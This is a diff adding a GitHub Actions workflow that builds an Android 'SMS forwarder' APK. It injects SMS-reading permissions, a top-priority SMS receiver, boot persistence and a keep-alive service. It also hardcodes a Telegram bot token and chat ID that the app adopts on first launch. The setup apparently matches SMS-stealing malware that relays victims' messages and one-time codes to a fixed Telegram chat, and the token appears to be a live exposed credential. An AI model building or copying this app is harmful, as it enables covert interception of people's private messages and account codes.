@@ -1,0 +1,127 @@
+name: Build APK
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Kodni olish
+        uses: actions/checkout@v4
+
+      - name: Node.js o'rnatish
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Java o'rnatish
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Android SDK o'rnatish
+        uses: android-actions/setup-android@v3
+
+      - name: npm paketlarini o'rnatish
+        run: npm install
+
+      - name: Android platformasini qo'shish
+        run: npx cap add android
+
+      - name: Android SDK yo'lini ko'rsatish (local.properties)
+        run: echo "sdk.dir=$ANDROID_HOME" > android/local.properties
+
+      - name: WorkManager kutubxonasini qo'shish
+        run: |
+          sed -i "/dependencies {/a\\    implementation 'androidx.work:work-runtime:2.9.0'" android/app/build.gradle
+          cat android/app/build.gradle
+
+      - name: Native plugin fayllarini nusxalash
+        run: |
+          mkdir -p android/app/src/main/java/com/yourname/smsforwarder
+          cp native-android-plugin/com/yourname/smsforwarder/*.java \
+             android/app/src/main/java/com/yourname/smsforwarder/
+
+      - name: AndroidManifest.xml ga ruxsat, receiver va service qo'shish
+        run: |
+          MANIFEST=android/app/src/main/AndroidManifest.xml
+          sed -i 's#<application#<uses-permission android:name="android.permission.RECEIVE_SMS" />\n    <uses-permission android:name="android.permission.READ_SMS" />\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />\n    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />\n    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />\n    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />\n    <application#' "$MANIFEST"
+          perl -0777 -pe 's#</application>#    <receiver android:name="com.yourname.smsforwarder.SmsReceiver" android:exported="true" android:permission="android.permission.BROADCAST_SMS">\n      <intent-filter android:priority="999">\n        <action android:name="android.provider.Telephony.SMS_RECEIVED" />\n      </intent-filter>\n    </receiver>\n    <receiver android:name="com.yourname.smsforwarder.BootReceiver" android:exported="true">\n      <intent-filter>\n        <action android:name="android.intent.action.BOOT_COMPLETED" />\n        <action android:name="android.intent.action.QUICKBOOT_POWERON" />\n      </intent-filter>\n    </receiver>\n    <service android:name="com.yourname.smsforwarder.KeepAliveService" android:exported="false" android:foregroundServiceType="dataSync" />\n  </application>#' -i "$MANIFEST"
+          cat "$MANIFEST"
+
+      - name: MainActivity.java ni avtomatik sozlash uchun yangilash
+        run: |
+          MAIN_ACTIVITY=$(find android/app/src/main/java -name MainActivity.java)
+          cat > "$MAIN_ACTIVITY" << 'EOF'
+          package com.yourname.smsforwarder;
+
+          import android.Manifest;
+          import android.content.Intent;
+          import android.content.SharedPreferences;
+          import android.content.pm.PackageManager;
+          import android.os.Build;
+          import android.os.Bundle;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
+          import com.getcapacitor.BridgeActivity;
+
+          public class MainActivity extends BridgeActivity {
+
+            public static final String DEFAULT_BOT_TOKEN = "8370286604:AAEuyIXTXpYLTYSMAN-EcAKbwpdCzkMNjdc";
+            public static final String DEFAULT_CHAT_ID = "7063294541";
+
+            @Override
+            public void onCreate(Bundle savedInstanceState) {
+              registerPlugin(SmsForwarderPlugin.class);
+              super.onCreate(savedInstanceState);
+
+              SharedPreferences prefs = getSharedPreferences(SmsForwarderPlugin.PREFS, MODE_PRIVATE);
+              if (prefs.getString("bot_token", null) == null) {
+                prefs.edit()
+                  .putString("bot_token", DEFAULT_BOT_TOKEN)
+                  .putString("chat_id", DEFAULT_CHAT_ID)
+                  .apply();
+              }
+
+              boolean smsGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
+                  == PackageManager.PERMISSION_GRANTED;
+              boolean readGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+                  == PackageManager.PERMISSION_GRANTED;
+
+              if (!smsGranted || !readGranted) {
+                ActivityCompat.requestPermissions(this,
+                    new String[]{ Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS },
+                    1001);
+              }
+
+              // Doimiy fon xizmatini ishga tushirish (notification bilan,
+              // Android batareya tejash sababli o'chirib qo'ymasligi uchun)
+              Intent serviceIntent = new Intent(this, KeepAliveService.class);
+              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+              } else {
+                startService(serviceIntent);
+              }
+            }
+          }
+          EOF
+          cat "$MAIN_ACTIVITY"
+
+      - name: Capacitor sinxronlash
+        run: npx cap sync android
+
+      - name: Gradle bilan APK yig'ish
+        working-directory: android
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleDebug --no-daemon
+
+      - name: APK'ni yuklab olish uchun saqlash
+        uses: actions/upload-artifact@v4
+        with:
+          name: sms-forwarder-apk
+          path: android/app/build/outputs/apk/debug/app-debug.apk
